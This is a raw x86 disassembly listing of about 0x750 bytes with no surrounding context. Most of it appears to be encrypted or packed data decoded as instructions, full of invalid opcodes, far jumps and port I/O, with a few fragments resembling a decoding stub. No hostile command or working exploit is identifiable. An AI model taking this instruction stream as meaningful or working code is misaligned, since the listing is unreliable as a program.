  40f9a0:	jns    0x40f9e7
  40f9a2:	inc    edx
  40f9a3:	out    0xe5,eax
  40f9a5:	cmp    DWORD PTR [edx*1+0x470ff6e],esi
  40f9ac:	push   edx
  40f9ad:	xor    al,0xa9
  40f9af:	inc    eax
  40f9b0:	jecxz  0x40f953
  40f9b2:	adc    eax,0x7461d9b3
  40f9b7:	push   ds
  40f9b8:	push   eax
  40f9b9:	out    0xf6,eax
  40f9bb:	jmp    FWORD PTR [ebx]
  40f9bd:	jae    0x40f9f8
  40f9bf:	icebp  
  40f9c0:	sub    DWORD PTR [edx-0x16],eax
  40f9c3:	pop    ss
  40f9c4:	fstp   QWORD PTR [ebx]
  40f9c6:	sub    al,0x1b
  40f9c8:	mov    ah,0x54
  40f9ca:	jmp    0x44ee:0x7ffcc75f
  40f9d1:	shl    BYTE PTR [esi+eax*4+0x77351356],cl
  40f9d8:	ss inc ebx
  40f9da:	add    BYTE PTR [ebx-0x49f0078b],cl
  40f9e0:	or     eax,0x43367b
  40f9e5:	adc    DWORD PTR ds:0x433733,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	dec    ecx
  40fa11:	loop   0x40fa66
  40fa13:	ud2    
  40fa15:	mov    ch,0x7e
  40fa17:	jle    0x40f9c5
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa40
  40fa1d:	aaa    
  40fa1e:	shl    DWORD PTR [edi+0x4f],0xd3
  40fa22:	jmp    0xa2ed:0x17918f99
  40fa29:	sub    ah,bh
  40fa2b:	ins    DWORD PTR es:[edi],dx
  40fa2c:	xchg   esi,eax
  40fa2d:	test   DWORD PTR [esi+0x6b],edi
  40fa30:	or     dh,ah
  40fa32:	fdivr  QWORD PTR [edi]
  40fa34:	dec    esi
  40fa35:	in     al,dx
  40fa36:	jae    0x40f9ea
  40fa38:	push   ebx
  40fa39:	daa    
  40fa3a:	push   es
  40fa3b:	jne    0x40fa09
  40fa3d:	ficom  DWORD PTR [edx-0x45cfb936]
  40fa43:	xchg   ecx,eax
  40fa44:	outs   dx,DWORD PTR ds:[esi]
  40fa45:	sbb    al,ah
  40fa47:	std    
  40fa48:	jl     0x40fa99
  40fa4a:	addr16 dec ebp
  40fa4c:	sub    al,0x5b
  40fa4e:	mov    eax,0x4732601f
  40fa53:	out    0x60,eax
  40fa55:	ds mov edi,0x8be5cc85
  40fa5b:	jns    0x40f9fc
  40fa5d:	out    0x24,al
  40fa5f:	mov    esp,0xe8a0a8fd
  40fa64:	xchg   ah,bh
  40fa66:	mov    eax,ds:0xa30e1395
  40fa6b:	adc    DWORD PTR [edi+0x7b],edx
  40fa6e:	sbb    DWORD PTR [edx+ecx*8],esp
  40fa71:	call   0x86d6dc13
  40fa76:	inc    esp
  40fa77:	push   0x7e
  40fa79:	inc    edi
  40fa7a:	mov    ebx,DWORD PTR [edi-0x34]
  40fa7d:	addr16 push ebp
  40fa7f:	leave  
  40fa80:	or     BYTE PTR [ebx-0x53],0x83
  40fa84:	jns    0x40fa45
  40fa86:	retf   0x50c7
  40fa89:	fnsave [ecx-0x623c70a8]
  40fa8f:	mov    ecx,0xceac1fdb
  40fa94:	scas   al,BYTE PTR es:[edi]
  40fa95:	add    al,0xa3
  40fa97:	rcr    DWORD PTR [esi-0x2d],1
  40fa9a:	xor    DWORD PTR [eax-0x2506ca47],ecx
  40faa0:	(bad)  
  40faa1:	push   DWORD PTR [eax]
  40faa3:	pop    edx
  40faa4:	pusha  
  40faa5:	sbb    eax,ebx
  40faa7:	adc    eax,0x1d38dd04
  40faac:	hlt    
  40faad:	push   0x9316cdc1
  40fab2:	sbb    DWORD PTR [edx-0x17acafe6],0xb9144306
  40fabc:	jmp    DWORD PTR [edi-0x9868f34]
  40fac2:	rol    BYTE PTR [ecx],0xd6
  40fac5:	ror    DWORD PTR [edx+0x2e],cl
  40fac8:	push   ebp
  40fac9:	loope  0x40fae6
  40facb:	mov    edi,0xc86fb3d5
  40fad0:	ret    
  40fad1:	dec    ecx
  40fad2:	xchg   DWORD PTR [ebx],ebx
  40fad4:	sbb    ch,cl
  40fad6:	pop    ebx
  40fad7:	mov    ebx,0x14ad7738
  40fadc:	and    BYTE PTR [eax+0x53],0xe8
  40fae0:	or     cl,BYTE PTR [eax+0x40]
  40fae3:	xor    al,0xe7
  40fae5:	cmp    eax,0x660200a5
  40faea:	clc    
  40faeb:	lods   al,BYTE PTR ds:[esi]
  40faec:	mov    eax,0x6f0172e0
  40faf1:	enter  0x6942,0xf0
  40faf5:	dec    edi
  40faf6:	xchg   esp,eax
  40faf7:	xchg   ecx,eax
  40faf8:	jge    0x40fb0e
  40fafa:	xchg   ebp,eax
  40fafb:	outs   dx,DWORD PTR ds:[esi]
  40fafc:	call   0x6be8233b
  40fb01:	je     0x40fb36
  40fb03:	sbb    ecx,esp
  40fb05:	push   es
  40fb06:	rcr    BYTE PTR [ecx+ebx*4+0x7d],1
  40fb0a:	jl     0x40fb87
  40fb0c:	push   edi
  40fb0d:	ret    0x6c43
  40fb10:	sub    eax,0x2dd2d14c
  40fb15:	out    dx,al
  40fb16:	add    ah,BYTE PTR [esi+0x5b]
  40fb19:	cmp    al,0x66
  40fb1b:	out    dx,eax
  40fb1c:	xchg   ecx,eax
  40fb1d:	shr    BYTE PTR [ebx-0x60],0x4f
  40fb21:	jecxz  0x40fb72
  40fb23:	mov    BYTE PTR [ebx+0x2aa89c5],ch
  40fb29:	test   BYTE PTR [ebp-0x31d70af9],al
  40fb2f:	push   ecx
  40fb30:	pop    ebx
  40fb31:	sbb    DWORD PTR [edx],edi
  40fb33:	and    cl,BYTE PTR [edi]
  40fb35:	jns    0x40fb04
  40fb37:	rcl    ebx,0x44
  40fb3a:	push   esp
  40fb3b:	mov    BYTE PTR [edx],bh
  40fb3d:	mov    al,0x92
  40fb3f:	retf   
  40fb40:	mov    dh,0xb5
  40fb42:	popf   
  40fb43:	lock retf 
  40fb45:	loop   0x40fb6c
  40fb47:	push   ebx
  40fb48:	and    esi,DWORD PTR [edi]
  40fb4a:	inc    ebp
  40fb4b:	mov    ebx,0xc3739b3c
  40fb50:	mov    esi,0x64068876
  40fb55:	add    eax,0x3f897d61
  40fb5a:	jne    0x40fbbe
  40fb5c:	sbb    ebp,DWORD PTR [ebx-0x58]
  40fb5f:	sub    ebx,DWORD PTR [edx]
  40fb61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb62:	mov    ecx,0x7326e766
  40fb67:	nop
  40fb68:	xchg   esp,eax
  40fb69:	push   edx
  40fb6a:	loopne 0x40fbc2
  40fb6c:	lock pop ds
  40fb6e:	or     BYTE PTR [edi],ah
  40fb70:	push   0x6da5b21
  40fb75:	daa    
  40fb76:	lods   eax,DWORD PTR ds:[esi]
  40fb77:	dec    ebp
  40fb78:	pop    ecx
  40fb79:	(bad)  
  40fb7a:	cmp    eax,DWORD PTR [esi-0x1a6c85ca]
  40fb80:	mov    bh,0x6f
  40fb82:	imul   ebp,DWORD PTR [eax],0xffffffe7
  40fb85:	dec    ebp
  40fb86:	cmp    edx,esi
  40fb88:	icebp  
  40fb89:	pop    ecx
  40fb8a:	icebp  
  40fb8b:	lock push ss
  40fb8d:	dec    edi
  40fb8e:	ret    0x7178
  40fb91:	cmp    BYTE PTR [edx-0x64],dh
  40fb94:	popf   
  40fb95:	iret   
  40fb96:	pop    eax
  40fb97:	pop    ecx
  40fb98:	dec    edx
  40fb99:	push   esp
  40fb9a:	fcmovne st,st(6)
  40fb9c:	test   eax,esi
  40fb9e:	mov    DWORD PTR [ebx-0x64eba1a7],ebp
  40fba4:	jbe    0x40fb7d
  40fba6:	gs cmp eax,0x36d46959
  40fbac:	mov    edx,edx
  40fbae:	ror    BYTE PTR [ecx-0x11],0x8a
  40fbb2:	outs   dx,DWORD PTR ds:[esi]
  40fbb3:	mov    cl,0xf0
  40fbb5:	test   dh,dl
  40fbb7:	mov    bl,0x59
  40fbb9:	arpl   WORD PTR [edi-0x726ecf72],sp
  40fbbf:	and    edi,DWORD PTR [ebp-0x29]
  40fbc2:	enter  0xb684,0xde
  40fbc6:	and    al,0xc
  40fbc8:	xchg   ebp,eax
  40fbc9:	adc    BYTE PTR [edx-0x46],ah
  40fbcc:	mov    BYTE PTR [ebx+0x12],ah
  40fbcf:	xor    esp,DWORD PTR [ebx+0x6e41fa08]
  40fbd5:	xor    al,0x46
  40fbd7:	test   DWORD PTR [edi+0x24bf123f],0xc0259b03
  40fbe1:	call   0xfe1b4db4
  40fbe6:	dec    esp
  40fbe8:	push   es
  40fbe9:	sub    al,BYTE PTR [esi*2+0x33a047b6]
  40fbf0:	sbb    eax,0x1316ebdd
  40fbf5:	inc    ebp
  40fbf6:	ds jle 0x40fbed
  40fbf9:	push   ss
  40fbfa:	cmp    bh,BYTE PTR [edx+0x18]
  40fbfd:	sub    DWORD PTR [eax-0x35],ecx
  40fc00:	fcomp  DWORD PTR [ecx]
  40fc02:	jns    0x40fc0a
  40fc04:	pop    edi
  40fc05:	add    al,0x22
  40fc07:	sub    BYTE PTR [edi+0x201bfda8],ch
  40fc0d:	mov    ch,0xbf
  40fc0f:	cs (bad) 
  40fc11:	xor    ecx,DWORD PTR [eax]
  40fc13:	dec    edi
  40fc14:	shl    DWORD PTR [edx],0x3d
  40fc17:	jmp    0x4776:0xd81ce7c4
  40fc1e:	mov    bl,0xc9
  40fc20:	jb     0x40fc8c
  40fc22:	pop    ss
  40fc23:	xlat   BYTE PTR ds:[ebx]
  40fc24:	sbb    eax,ebx
  40fc26:	push   edx
  40fc27:	or     BYTE PTR [esi+0x5b735a4d],bh
  40fc2d:	mov    ebp,0x28f66119
  40fc32:	mov    dh,0xd6
  40fc34:	push   es
  40fc35:	and    DWORD PTR [ecx+0x62],ebx
  40fc38:	jnp    0x40fc32
  40fc3a:	les    ebx,FWORD PTR [ebx-0xb2b961b]
  40fc40:	out    dx,eax
  40fc41:	lahf   
  40fc42:	sub    ch,BYTE PTR [ebp+0x53]
  40fc45:	leave  
  40fc46:	loop   0x40fcc3
  40fc48:	pusha  
  40fc49:	cmp    DWORD PTR [ecx-0x55634e76],ecx
  40fc4f:	push   0xffffffa3
  40fc51:	xchg   BYTE PTR [ebx-0x3f],ah
  40fc54:	xor    DWORD PTR [edi],0xffffffb5
  40fc57:	ja     0x40fc5d
  40fc59:	mov    cl,0x94
  40fc5b:	std    
  40fc5c:	(bad)  
  40fc5d:	in     al,0xdb
  40fc5f:	xor    edx,DWORD PTR [edx]
  40fc61:	push   ss
  40fc62:	or     al,0x8b
  40fc64:	pop    eax
  40fc65:	inc    esp
  40fc66:	cmp    BYTE PTR ds:0xedb95a27,al
  40fc6c:	shl    DWORD PTR [ebp-0xf],cl
  40fc6f:	or     eax,esp
  40fc71:	ror    BYTE PTR [esi-0x43],0x44
  40fc75:	push   ss
  40fc76:	cmp    bp,WORD PTR [ecx+0x25]
  40fc7a:	adc    al,BYTE PTR [edx]
  40fc7c:	sti    
  40fc7d:	popa   
  40fc7e:	cmp    al,0xfc
  40fc80:	or     BYTE PTR [esi+ebx*4+0x27],dh
  40fc84:	cmp    al,0x1d
  40fc86:	sub    ecx,esi
  40fc88:	int3   
  40fc89:	add    al,0xa3
  40fc8b:	popa   
  40fc8c:	ret    0x8e1b
  40fc8f:	ds hlt 
  40fc91:	into   
  40fc92:	or     edx,ecx
  40fc94:	shl    al,1
  40fc96:	adc    ecx,DWORD PTR [esi+0x4c]
  40fc99:	pushf  
  40fc9a:	jl     0x40fc38
  40fc9c:	sti    
  40fc9d:	dec    edi
  40fc9e:	outs   dx,BYTE PTR ds:[esi]
  40fc9f:	adc    BYTE PTR [esi+0x5a],al
  40fca2:	enter  0x5010,0x78
  40fca6:	push   eax
  40fca7:	mov    edi,0x4e7c3e83
  40fcac:	data16 fst DWORD PTR [edi+0x57]
  40fcb0:	aam    0xe6
  40fcb2:	not    BYTE PTR [eax+0x1b0248ba]
  40fcb8:	in     al,0xbf
  40fcba:	and    eax,DWORD PTR [esi]
  40fcbc:	stos   BYTE PTR es:[edi],al
  40fcbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcbe:	addps  xmm7,xmm1
  40fcc1:	loope  0x40fd29
  40fcc3:	add    edi,DWORD PTR [eax-0x75]
  40fcc6:	aaa    
  40fcc7:	cmp    BYTE PTR [esi-0x4f],ch
  40fcca:	fs ss popa 
  40fccd:	xchg   ebx,eax
  40fcce:	add    esi,ecx
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	ror    DWORD PTR [eax+0x40],0x23
  40fce6:	retf   0xb3b9
  40fce9:	jle    0x40fd69
  40fceb:	lods   al,BYTE PTR ds:[esi]
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fccb
  40fcf0:	gs in  al,0x65
  40fcf3:	gs jne 0x40fd03
  40fcf6:	inc    esp
  40fcf7:	dec    edx
  40fcf8:	xchg   BYTE PTR ds:0xcd61f522,ah
  40fcfe:	jo     0x40fd13
  40fd00:	jb     0x40fccd
  40fd02:	nop
  40fd03:	and    eax,0x2cd5ef5
  40fd08:	fisubr WORD PTR [ebp-0x56]
  40fd0b:	sub    eax,0x3c356400
  40fd10:	(bad)  ds:0x2e68ce2
  40fd16:	sbb    al,0xe2
  40fd18:	enter  0xb3d,0x25
  40fd1c:	adc    esi,ebx
  40fd1e:	loope  0x40fcca
  40fd20:	mov    dh,0xd5
  40fd22:	repnz push esi
  40fd24:	push   ds
  40fd25:	sbb    eax,0x67d4f0
  40fd2a:	cs xchg edi,eax
  40fd2c:	loop   0x40fd58
  40fd2e:	and    DWORD PTR [edi-0x65],0x8c57ab93
  40fd35:	imul   eax,esi,0x17
  40fd38:	adc    BYTE PTR [ecx],0xd5
  40fd3b:	mov    ch,0x4f
  40fd3d:	inc    edi
  40fd3e:	icebp  
  40fd3f:	pop    edx
  40fd40:	out    0x6e,al
  40fd42:	xchg   edx,eax
  40fd43:	dec    edx
  40fd44:	jnp    0x40fdae
  40fd46:	xchg   edi,eax
  40fd47:	(bad)  
  40fd48:	frstor [ebp-0x1a]
  40fd4b:	jmp    0x66967d8b
  40fd50:	jno    0x40fd0d
  40fd52:	popf   
  40fd53:	dec    ebp
  40fd54:	pop    edi
  40fd55:	test   eax,0x16dda2e5
  40fd5a:	ins    DWORD PTR es:[edi],dx
  40fd5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd5c:	ins    DWORD PTR es:[edi],dx
  40fd5d:	dec    ecx
  40fd5e:	xchg   esi,eax
  40fd5f:	repz or ebx,DWORD PTR [esp+edx*4+0x73]
  40fd64:	ins    DWORD PTR es:[edi],dx
  40fd65:	xor    eax,0xd165ea07
  40fd6a:	inc    esp
  40fd6b:	pushw  0xff9e
  40fd6e:	jae    0x40fd21
  40fd70:	push   ebp
  40fd71:	into   
  40fd72:	pop    eax
  40fd73:	pop    ebp
  40fd74:	rcr    DWORD PTR [ebp-0xe4f0ad9],1
  40fd7a:	xor    ah,ah
  40fd7c:	es mov eax,0xc61141fc
  40fd82:	jmp    0x8d1b:0x2e50f790
  40fd89:	inc    edx
  40fd8a:	clc    
  40fd8b:	cmp    edx,DWORD PTR [esi+0x6d]
  40fd8e:	ins    BYTE PTR es:[edi],dx
  40fd8f:	mov    BYTE PTR [eax-0x18],dl
  40fd92:	enter  0x17a7,0x8f
  40fd96:	and    BYTE PTR [eax-0x73],al
  40fd99:	xor    eax,0x3d89427d
  40fd9e:	enter  0x3831,0xdf
  40fda2:	mov    ebx,0x87753c54
  40fda7:	retf   0xf8aa
  40fdaa:	jle    0x40fd7c
  40fdac:	lahf   
  40fdad:	int3   
  40fdae:	sti    
  40fdaf:	sub    edi,DWORD PTR [ebx-0x494a5b0b]
  40fdb5:	xchg   ecx,eax
  40fdb6:	lods   eax,DWORD PTR ds:[esi]
  40fdb7:	imul   edi,ecx,0x5b
  40fdba:	xchg   ecx,eax
  40fdbb:	mov    bh,BYTE PTR [ebx]
  40fdbd:	imul   edi,DWORD PTR [edi+0x45],0xb
  40fdc1:	or     bh,BYTE PTR [edx+edi*2-0x21]
  40fdc5:	fistp  QWORD PTR [edi]
  40fdc7:	pop    ss
  40fdc8:	mov    ds:0x9b1024d5,eax
  40fdcd:	jb     0x40fdfc
  40fdcf:	mov    eax,ds:0x5088ed66
  40fdd4:	adc    eax,0x47d25ed2
  40fdd9:	fxch   st(1)
  40fddb:	iret   
  40fddc:	out    dx,al
  40fddd:	xor    ebx,DWORD PTR [edx-0x2f7e7fc3]
  40fde3:	int3   
  40fde4:	std    
  40fde5:	or     edi,DWORD PTR [ebx+0x275d5064]
  40fdeb:	mul    eax
  40fded:	pushf  
  40fdee:	fadd   QWORD PTR [ebx-0x35019d63]
  40fdf4:	sbb    DWORD PTR [edx],esp
  40fdf6:	pusha  
  40fdf7:	inc    esi
  40fdf8:	mov    dh,0x4f
  40fdfa:	cmp    al,0xd0
  40fdfc:	and    al,0x5d
  40fdfe:	ret    0x6aed
  40fe01:	out    dx,al
  40fe02:	and    bh,BYTE PTR [edx+eiz*8-0x2e9b45e4]
  40fe09:	dec    esi
  40fe0a:	retf   0x8a6b
  40fe0d:	ins    DWORD PTR es:[edi],dx
  40fe0e:	bound  edi,QWORD PTR [ebp-0x530c8e17]
  40fe14:	or     eax,0x357742fa
  40fe19:	jno    0x40fe67
  40fe1b:	test   ch,ch
  40fe1d:	mov    DWORD PTR [ebp+0x674b2abd],ebx
  40fe23:	mov    esi,0x9edcac51
  40fe28:	fs dec edx
  40fe2a:	icebp  
  40fe2b:	in     eax,0xaa
  40fe2d:	sub    BYTE PTR [ebx],0xa6
  40fe30:	dec    esp
  40fe31:	push   edi
  40fe32:	inc    edx
  40fe33:	icebp  
  40fe34:	stos   BYTE PTR es:[edi],al
  40fe35:	cmp    al,0x96
  40fe37:	pop    ebp
  40fe38:	cmp    al,0x38
  40fe3a:	dec    ebp
  40fe3b:	jmp    0x40fe6a
  40fe3d:	mov    cl,0x90
  40fe3f:	sub    ebx,DWORD PTR [ecx-0x76]
  40fe42:	stos   DWORD PTR es:[edi],eax
  40fe43:	ja     0x40fe65
  40fe45:	repnz hlt 
  40fe47:	adc    al,0x6d
  40fe49:	pop    esp
  40fe4a:	mov    dl,0x2a
  40fe4c:	sub    BYTE PTR [edi+0x58],ah
  40fe4f:	dec    ebx
  40fe50:	sub    al,0x8
  40fe52:	mov    ebp,edi
  40fe54:	sbb    ebp,DWORD PTR [esi-0x32]
  40fe57:	jns    0x40fed7
  40fe59:	(bad)  
  40fe5a:	sub    al,0xa
  40fe5c:	cmp    al,0x3c
  40fe5e:	xor    ebx,DWORD PTR [esi]
  40fe60:	call   0x181e:0x5c58b7d6
  40fe67:	jae    0x40fe0c
  40fe69:	inc    ecx
  40fe6a:	mov    DWORD PTR [edx-0x2b],edi
  40fe6d:	jle    0x40fee8
  40fe6f:	(bad)  
  40fe70:	cs mov ch,dh
  40fe73:	or     ebx,DWORD PTR [esi]
  40fe75:	aas    
  40fe76:	push   esp
  40fe77:	cmp    esi,ebp
  40fe79:	jp     0x40fee0
  40fe7b:	hlt    
  40fe7c:	(bad)  
  40fe7d:	xchg   esi,eax
  40fe7e:	arpl   WORD PTR [esi],di
  40fe80:	push   ebx
  40fe81:	(bad)  
  40fe83:	mov    BYTE PTR [esp+esi*4],dh
  40fe86:	mov    al,ds:0xa84bed35
  40fe8b:	or     eax,0x1682588
  40fe90:	mov    DWORD PTR [ebp+ebp*1+0x491b6118],eax
  40fe97:	inc    ebx
  40fe98:	mov    esi,0x438bd1a2
  40fe9d:	cdq    
  40fe9e:	xchg   DWORD PTR [eax],eax
  40fea0:	adc    ah,bl
  40fea2:	fld    QWORD PTR [eax]
  40fea4:	call   0x7083b
  40fea9:	mov    ah,0x9b
  40feab:	adc    ebx,DWORD PTR [ebp+0x4a]
  40feae:	sbb    bl,BYTE PTR [ecx+0x59e53f98]
  40feb4:	inc    ecx
  40feb5:	cld    
  40feb6:	sar    eax,cl
  40feb8:	jae    0x40ff27
  40feba:	ins    BYTE PTR es:[edi],dx
  40febb:	imul   edx,DWORD PTR [ebx-0x18ba3034],0x435de949
  40fec5:	xchg   edx,eax
  40fec6:	adc    edx,DWORD PTR [esi+0x79]
  40fec9:	retf   
  40feca:	ror    DWORD PTR [esi],cl
  40fecc:	ficomp WORD PTR [eax-0x4c]
  40fecf:	xchg   edi,eax
  40fed0:	pop    ss
  40fed1:	xlat   BYTE PTR ds:[ebx]
  40fed2:	adc    DWORD PTR [ebx-0x33],ecx
  40fed5:	fnstcw WORD PTR [ebx]
  40fed7:	ud0    ebx,ecx
  40feda:	xchg   DWORD PTR [esi],eax
  40fedc:	idiv   BYTE PTR [edx-0x1ecad43d]
  40fee2:	outs   dx,BYTE PTR ds:[esi]
  40fee3:	iret   
  40fee4:	xchg   BYTE PTR [eax+0x20947359],bh
  40feea:	inc    eax
  40feeb:	scas   al,BYTE PTR es:[edi]
  40feec:	pop    ebx
  40feed:	mov    bl,0xd5
  40feef:	icebp  
  40fef0:	sti    
  40fef1:	fist   DWORD PTR [edi-0x1221ff71]
  40fef7:	mov    edx,0x634e5182
  40fefc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fefd:	xor    al,0xda
  40feff:	lea    esi,[esi+0x1ccc95fc]
  40ff05:	int    0xc7
  40ff07:	loopne 0x40ff66
  40ff09:	dec    edx
  40ff0a:	mov    bl,0xb2
  40ff0c:	or     bh,al
  40ff0e:	adc    BYTE PTR [ecx+0x41dd2b00],0xc5
  40ff15:	jg     0x40feaa
  40ff17:	es nop
  40ff19:	ret    0x5a96
  40ff1c:	xor    eax,0xd4d32ba2
  40ff21:	jno    0x40feb9
  40ff23:	push   0x14
  40ff25:	jne    0x40ff49
  40ff27:	scas   al,BYTE PTR es:[edi]
  40ff28:	ins    DWORD PTR es:[edi],dx
  40ff29:	or     DWORD PTR [ebp+0x48],ebp
  40ff2c:	(bad)  
  40ff2d:	pop    ebx
  40ff2e:	inc    ebx
  40ff2f:	repz stc 
  40ff31:	loope  0x40ffa9
  40ff33:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40ff35:	mov    cl,0xf4
  40ff37:	dec    edi
  40ff38:	outs   dx,BYTE PTR ds:[esi]
  40ff39:	shl    BYTE PTR [ebx],0xf7
  40ff3c:	addr16 push edi
  40ff3e:	or     al,0xb1
  40ff40:	inc    esp
  40ff41:	retf   
  40ff42:	test   al,0x1c
  40ff44:	js     0x40ff1b
  40ff46:	mov    eax,0xdc622c86
  40ff4b:	bound  edx,QWORD PTR [edi]
  40ff4d:	ret    0x219b
  40ff50:	mov    esi,0xeca9cf53
  40ff55:	mov    esp,DWORD PTR [esi]
  40ff57:	or     eax,0xa42816d7
  40ff5c:	loope  0x40ffc8
  40ff5e:	outs   dx,BYTE PTR ds:[esi]
  40ff5f:	pop    ecx
  40ff60:	jl     0x40ff66
  40ff62:	dec    esi
  40ff63:	sahf   
  40ff64:	mov    gs,WORD PTR [ebx]
  40ff66:	aas    
  40ff67:	loope  0x40ffe1
  40ff69:	rol    ebx,0xb6
  40ff6c:	mov    bh,0x82
  40ff6e:	add    BYTE PTR [esi],0x6c
  40ff71:	jg     0x40ff6b
  40ff73:	pushf  
  40ff74:	loop   0x40ff2a
  40ff76:	mov    esp,0xd9558b4f
  40ff7b:	and    al,0xb0
  40ff7d:	imul   BYTE PTR [ebp-0x53]
  40ff80:	pop    edx
  40ff81:	sahf   
  40ff82:	jae    0x40ffcb
  40ff84:	xchg   edx,eax
  40ff85:	mov    esi,0xfe7a8a78
  40ff8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff8b:	inc    edx
  40ff8c:	adc    dh,al
  40ff8e:	scas   eax,DWORD PTR es:[edi]
  40ff8f:	js     0x40ffbf
  40ff91:	jmp    0xf6f3:0xf3ae5b51
  40ff98:	push   0xffffff8f
  40ff9a:	dec    edi
  40ff9b:	pop    eax
  40ff9c:	adc    al,0xe
  40ff9e:	dec    esp
  40ff9f:	out    dx,eax
  40ffa0:	and    al,0xf
  40ffa2:	scas   eax,DWORD PTR es:[edi]
  40ffa3:	(bad)  
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433623,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4336e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0x31cd39b1
  40ffd9:	dec    ebp
  40ffda:	jmp    0x7ebfbed6
  40ffdf:	lods   al,BYTE PTR ds:[esi]
  40ffe0:	jl     0x410060
  40ffe2:	jle    0x40ffeb
  40ffe4:	inc    ecx
  40ffe5:	and    DWORD PTR [ebx],edx
  40ffe7:	mov    ch,0x9f
  40ffe9:	dec    esp
  40ffea:	and    edx,DWORD PTR [eax-0x3af9f4bf]
  40fff0:	stc    
  40fff1:	ins    BYTE PTR es:[edi],dx
  40fff2:	add    BYTE PTR [edi-0x54],0xab
  40fff6:	mov    ebx,0x324a14b8
  40fffb:	in     al,dx
  40fffc:	jmp    0xd3a3:0x5e9f78ea
  410003:	xlat   BYTE PTR ds:[ebx]
  410004:	fcomi  st,st(0)
  410006:	xlat   BYTE PTR ds:[ebx]
  410007:	les    edi,FWORD PTR [ebp+ebp*8+0x4f]
  41000b:	xchg   ecx,ebp
  41000d:	ins    DWORD PTR es:[edi],dx
  41000e:	xchg   ecx,eax
  41000f:	daa    
  410010:	inc    BYTE PTR [edi+0x78d3e4c4]
  410016:	in     al,dx
  410017:	je     0x40fffb
  410019:	push   ebp
  41001a:	stos   BYTE PTR es:[edi],al
  41001b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41001c:	ds cmp eax,0xd8a27429
  410022:	xor    eax,0x6a328c0d
  410027:	(bad)  
  410028:	jno    0x41006c
  41002a:	dec    esi
  41002b:	and    esi,DWORD PTR [esi]
  41002d:	sti    
  41002e:	push   ebx
  41002f:	cld    
  410030:	xchg   ecx,eax
  410031:	adc    BYTE PTR [eax-0x9c5a9f5],dh
  410037:	fs dec ebx
  410039:	(bad)  
  41003a:	into   
  41003b:	nop
  41003c:	or     edx,DWORD PTR [ebx+0x2ff5710d]
  410042:	dec    ecx
  410043:	add    bl,BYTE PTR [esp+esi*1+0x1b533d91]
  41004a:	dec    esp
  41004b:	mov    ecx,0xcfc66434
  410050:	add    DWORD PTR [ebx],0x2ddea0b3
  410056:	xchg   ebp,eax
  410057:	test   BYTE PTR [ebx+ecx*8],bh
  41005a:	test   bl,ch
  41005c:	stos   DWORD PTR es:[edi],eax
  41005d:	es jp  0x41001a
  410060:	pop    edi
  410061:	and    eax,0xd52ef737
  410066:	pop    esi
  410067:	mov    dl,0xeb
  410069:	mov    edi,0x1043ff8f
  41006e:	push   ebx
  41006f:	pop    esp
  410070:	popf   
  410071:	sbb    dh,BYTE PTR [ebx+0x6196351b]
  410077:	das    
  410078:	es adc al,0x4d
  41007b:	fbld   TBYTE PTR [ecx*8-0x5dfd411b]
  410082:	iret   
  410083:	adc    esi,ecx
  410085:	dec    ebx
  410086:	or     BYTE PTR [ebx+0x3c24c5ca],0xfc
  41008d:	sbb    dh,BYTE PTR ds:0x9df8ef20
  410093:	enter  0xf193,0x69
  410097:	ja     0x410031
  410099:	adc    bl,bl
  41009b:	loopne 0x41010f
  41009d:	in     eax,0x86
  41009f:	and    bh,ah
  4100a1:	adc    eax,0x10ecc362
  4100a6:	pop    esp
  4100a7:	jge    0x410080
  4100a9:	xlat   BYTE PTR ds:[ebx]
  4100aa:	xor    al,0x3c
  4100ac:	jns    0x4100e3
  4100ae:	jae    0x4100c5
  4100b0:	std    
  4100b1:	je     0x41012b
  4100b3:	sbb    ah,bh
  4100b5:	in     eax,dx
  4100b6:	mov    edx,0x7cb09eed
  4100bb:	add    ch,dh
  4100bd:	cmp    DWORD PTR [ebx+0x41],ecx
  4100c0:	or     BYTE PTR [ecx+0x19],dh
  4100c3:	shl    DWORD PTR [ebp+0x2f11e3f1],0x8a
  4100ca:	aas    
  4100cb:	clc    
  4100cc:	mov    bl,0xa1
  4100ce:	cdq    
  4100cf:	(bad)  
  4100d0:	push   ds
  4100d1:	test   al,0xe5
  4100d3:	jge    0x410138
  4100d5:	adc    al,BYTE PTR [ebx+ebp*2-0x67]
  4100d9:	pop    edi
  4100da:	inc    edi
  4100db:	rol    DWORD PTR [edx],cl
  4100dd:	in     al,0xb1
  4100df:	or     esi,DWORD PTR [edx+eax*8+0x766ae393]
  4100e6:	jg     0x4100d2
  4100e8:	mov    ecx,0x714540db
  4100ed:	(bad)  
  4100ee:	cmp    DWORD PTR [ebp-0x6c4bb9ce],ecx
  4100f4:	mov    eax,ds:0xbffca760
  4100f9:	hlt    
  4100fa:	retf   
